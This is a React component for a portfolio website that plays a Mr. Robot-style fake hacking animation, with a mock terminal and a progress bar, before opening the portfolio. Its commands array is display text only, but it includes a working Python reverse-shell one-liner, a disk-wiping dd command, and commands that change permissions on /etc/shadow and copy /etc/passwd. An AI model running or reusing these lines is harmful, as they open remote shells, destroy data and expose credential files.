"use client"

import { useState, useEffect, useRef } from "react"
import { useWindowManager } from "@/hooks/use-window-manager"
import GlitchText from "@/components/hacking/glitch-text"

interface MrRobotHackProps {
  onComplete: () => void
}

export default function MrRobotHack({ onComplete }: MrRobotHackProps) {
  const [stage, setStage] = useState<number>(0)
  const [text, setText] = useState("")
  const [showFsociety, setShowFsociety] = useState(false)
  const [glitchIntensity, setGlitchIntensity] = useState(0)
  const [commandLines, setCommandLines] = useState<string[]>([])
  const { openWindow } = useWindowManager()
  const containerRef = useRef<HTMLDivElement>(null)
  const browserRef = useRef<string | null>(null)

  // Stages of the hack animation
  const stages = [
    { text: "Initializing system breach...", duration: 3000 },
    { text: "Bypassing kernel security...", duration: 3000 },
    { text: "Accessing root directory...", duration: 3000 },
    { text: "Injecting payload...", duration: 3000 },
    { text: "Extracting portfolio data...", duration: 5000 },
    { text: "Preparing browser redirect...", duration: 5000 },
    { text: "Hello, friend.", duration: 4000 },
    { text: "Hack complete. Launching portfolio...", duration: 4000 },
  ]

  // Commands that will appear during the hack
  const commands = [
    "sudo apt-get install fsociety",
    "cd /root/fsociety",
    "./fsociety.py",
    "set TARGET_IP 192.168.1.1",
    "run bruteforce --method=advanced",
    "sudo chmod 777 /etc/shadow",
    "cat /etc/passwd > /tmp/data",
    "ssh -i private_key root@target.com",
    'find / -name "portfolio" -type d',
    "dd if=/dev/urandom of=/dev/sda bs=4M",
    "wget https://faizzyhon.com/portfolio.tar.gz",
    "tar -xzvf portfolio.tar.gz",
    'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);\'',
    "curl -s https://faizzyhon.com/portfolio > /var/www/html/index.html",
    "echo 'Launching portfolio in 3...2...1...'",
  ]

  useEffect(() => {
    // Add glitch effect to the container
    const glitchInterval = setInterval(() => {
      if (containerRef.current) {
        const glitchX = Math.random() * 10 - 5
        const glitchY = Math.random() * 10 - 5
        containerRef.current.style.transform = `translate(${glitchX}px, ${glitchY}px)`

        setTimeout(() => {
          if (containerRef.current) {
            containerRef.current.style.transform = "translate(0, 0)"
          }
        }, 100)
      }

      // Randomly increase glitch intensity
      if (Math.random() > 0.7) {
        setGlitchIntensity((prev) => Math.min(prev + 1, 10))
      } else {
        setGlitchIntensity((prev) => Math.max(prev - 1, 0))
      }
    }, 800)

    // Add command lines at random intervals
    const commandInterval = setInterval(() => {
      if (commandLines.length < commands.length) {
        setCommandLines((prev) => [...prev, commands[prev.length]])
      }
    }, 1500)

    // Show fsociety logo after a delay
    setTimeout(() => {
      setShowFsociety(true)
    }, 8000)

    // Progress through stages
    let currentStage = 0
    const totalDuration = 0

    const progressStages = () => {
      if (currentStage < stages.length) {
        setText(stages[currentStage].text)
        setStage(currentStage)

        setTimeout(() => {
          currentStage++
          if (currentStage < stages.length) {
            progressStages()
          } else {
            // Open browser with portfolio when complete
            browserRef.current = openWindow("browser")

            // Wait a moment before calling onComplete
            setTimeout(() => {
              onComplete()
            }, 1000)
          }
        }, stages[currentStage].duration)
      }
    }

    progressStages()

    return () => {
      clearInterval(glitchInterval)
      clearInterval(commandInterval)
    }
  }, [onComplete, openWindow])

  return (
    <div ref={containerRef} className="fixed inset-0 z-50 bg-black overflow-hidden" style={{ fontFamily: "monospace" }}>
      {/* Glitch overlay */}
      <div
        className="absolute inset-0 bg-red-500 mix-blend-screen opacity-10"
        style={{
          backgroundImage:
            "url(\"data:image/svg+xml,%3Csvg width='100%25' height='100%25' xmlns='http://www.w3.org/2000/svg'%3E%3Cdefs%3E%3Cpattern id='smallGrid' width='8' height='8' patternUnits='userSpaceOnUse'%3E%3Cpath d='M 8 0 L 0 0 0 8' fill='none' stroke='%23f00' strokeWidth='0.5'/%3E%3C/pattern%3E%3C/defs%3E%3Crect width='100%25' height='100%25' fill='url(%23smallGrid)'/%3E%3C/svg%3E\")",
          filter: `blur(${glitchIntensity}px)`,
          animation: "glitch 0.5s infinite alternate-reverse",
        }}
      />

      {/* Main content */}
      <div className="flex flex-col items-center justify-center h-full p-8 relative">
        {/* fsociety logo */}
        {showFsociety && (
          <div className="mb-8 glitch-image">
            <div
              className="text-red-600 text-6xl font-bold mb-2 tracking-tighter"
              style={{ fontFamily: "Arial Black, sans-serif" }}
            >
              <GlitchText text="fsociety" />
            </div>
            <div className="text-white text-lg mb-8">
              <GlitchText text="control is an illusion" />
            </div>
          </div>
        )}

        {/* Main hack text */}
        <div className="text-green-500 text-2xl mb-8 text-center max-w-2xl">
          <GlitchText text={text} intensity={glitchIntensity / 3} />
        </div>

        {/* Command terminal */}
        <div className="w-full max-w-2xl bg-black border border-green-500 p-4 font-mono text-green-500 h-64 overflow-y-auto">
          {commandLines.map((cmd, index) => (
            <div key={index} className="mb-1">
              <span className="text-red-500">root@kali:</span>
              <span className="text-blue-500">~#</span> {cmd}
            </div>
          ))}
          {/* Blinking cursor */}
          <div className="flex">
            <span className="text-red-500">root@kali:</span>
            <span className="text-blue-500">~#</span>
            <span className="ml-1 animate-pulse">_</span>
          </div>
        </div>

        {/* Progress indicator */}
        <div className="mt-8 w-full max-w-2xl">
          <div className="flex justify-between text-xs text-white mb-2">
            <span>HACK PROGRESS</span>
            <span>{Math.min(Math.round((stage / (stages.length - 1)) * 100), 100)}%</span>
          </div>
          <div className="w-full bg-gray-900 h-2 overflow-hidden">
            <div
              className="bg-red-600 h-full transition-all duration-300"
              style={{ width: `${(stage / (stages.length - 1)) * 100}%` }}
            ></div>
          </div>
        </div>

        {/* Warning text */}
        <div className="mt-8 text-red-600 text-sm animate-pulse">
          {stage > 4 ? "WARNING: SECURITY BREACH DETECTED" : "SYSTEM VULNERABILITY EXPLOITED"}
        </div>
      </div>

      {/* Scan lines effect */}
      <div
        className="absolute inset-0 pointer-events-none"
        style={{
          background: "linear-gradient(transparent 50%, rgba(0, 0, 0, 0.5) 50%)",
          backgroundSize: "100% 4px",
          zIndex: 10,
        }}
      ></div>

      {/* CRT flicker effect */}
      <div
        className="absolute inset-0 pointer-events-none opacity-10"
        style={{
          background: "radial-gradient(ellipse at center, rgba(255,255,255,0.2) 0%, rgba(0,0,0,0.2) 100%)",
          animation: "flicker 0.15s infinite alternate-reverse",
        }}
      ></div>
    </div>
  )
}
